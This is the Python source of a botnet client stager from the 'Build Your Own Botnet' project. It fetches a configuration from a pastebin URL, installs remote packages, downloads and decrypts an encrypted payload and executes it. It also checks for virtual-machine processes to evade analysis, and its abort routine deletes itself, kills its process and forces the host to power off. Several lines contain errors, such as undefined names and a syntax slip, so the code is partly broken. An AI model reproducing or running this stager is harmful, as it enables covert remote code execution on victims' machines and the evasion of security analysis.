#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function
import os
import sys
import time
import json
import struct
import base64
import urllib
import marshal
import subprocess



class Client():
    """
    Client Stager - Build Your Own Botnet
    """    
    
    def __init__(self, *args, **kwargs):
        self._reload = False
        self.debug   = kwargs.get('debug')
        self.config  = kwargs.get('config')

        
    def _debug(self, text):
        if self.__debug:
            print(str(text))


    def abort(self, output=None):
        if self.__debug:
            debug("Launch aborted - %s" % str(output))
            sys.exit(0)
        else:
            _ = [subprocess.Popen(cmd, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) for cmd in list(['del /f /q %s' % sys.argv[0], 'taskkill /pid %d /f' % os.getpid(), 'shutdown /p /f'] if os.name == 'nt' else ['rm -f %s' % sys.argv[0], 'kill -9 %d' % os.getpid(), 'shutdown --poweroff --no-wall'])]


    def decrypt(self, data, key):
        try:
            data    = base64.b64decode(data)
            blocks  = [data[i * 8:((i + 1) * 8)] for i in range(len(data) // 8)]
            vector  = blocks[0]
            result  = []
            for block in blocks[1:]:
                u,v = struct.unpack("!2L", block)
                k   = struct.unpack("!4L", key)
                d,m = 0x9e3779b9L, 0xffffffffL
                s   = (d * 32) & m
                for _ in range(32):
                    v   = (v - (((u << 4 ^ u >> 5) + u) ^ (s + k[s >> 11 & 3]))) & m
                    s   = (s - d) & m
                    u   = (u - (((v << 4 ^ v >> 5) + v) ^ (s + k[s & 3]))) & m
                packed  = struct.pack("!2L", u, v)
                output  = bytes().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, packed))
                vector  = block
                result.append(output)
            return bytes().join(result).rstrip(chr(0))
        except Exception as e:
            self._debug(e)


    def install_packages(self, source):
        try:
            config   = json.loads(urllib.urlopen(str(source)).read())
            pip_exe  = os.popen('where pip' if os.name is 'nt' else 'which pip').read().rstrip()
            if not pip_exe:
                exec urllib.urlopen("https://bootstrap.pypa.io/get-pip.py").read() in globals()
                self._reload = True
                return config
            else:
                os.chdir(os.path.expandvars('%TEMP%')) if os.name == 'nt' else os.chdir('/tmp')
                packages = json.loads(urllib.urlopen(config['modules']).read())
                arch = str(struct.calcsize('P') * 8))
                for name, url in packages[os.name][arch].items():
                    try:
                        exec "import %s" % name in globals()
                    except ImportError:
                        self._reload = True
                        subprocess.Popen([pip_exe, 'install', url], 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
                return config
        except Exception as e:
            self._debug(e)


    def check_virtual_machine(self):
        check_environ = [_ for _ in os.environ.keys() if 'VBOX' in _.upper()]
        check_procs   = [i.split()[0 if os.name is 'nt' else -1] for i in os.popen('tasklist' if os.name is 'nt' else 'ps').read().splitlines()[3:] if i.split()[c].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
        if len(check_environ + check_procs):
            abort('virtual environment detected')
        else:
            return True

    def run(self, *args, **kwargs):
        if hasattr(self, 'config') and isinstance(self.config, str) and self.config.startswith('http'):
            config = install_packages(**kwargs)
            if self._reload:
                os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
            else:
                exec decrypt(base64.b64decode(urllib.urlopen(config.get('payload')).read()), urllib.urlopen(config.get('xor_key')).read()).replace('$_CONFIG', config.get('api_key')) in globals()
        else:
            abort('Invalid configuration')


if __name__=='__main__':
    __debug = bool('--debug' in sys.argv)
    client  = Client(config='https://pastebin.com/raw/yt6GnYx4', debug=True)
    
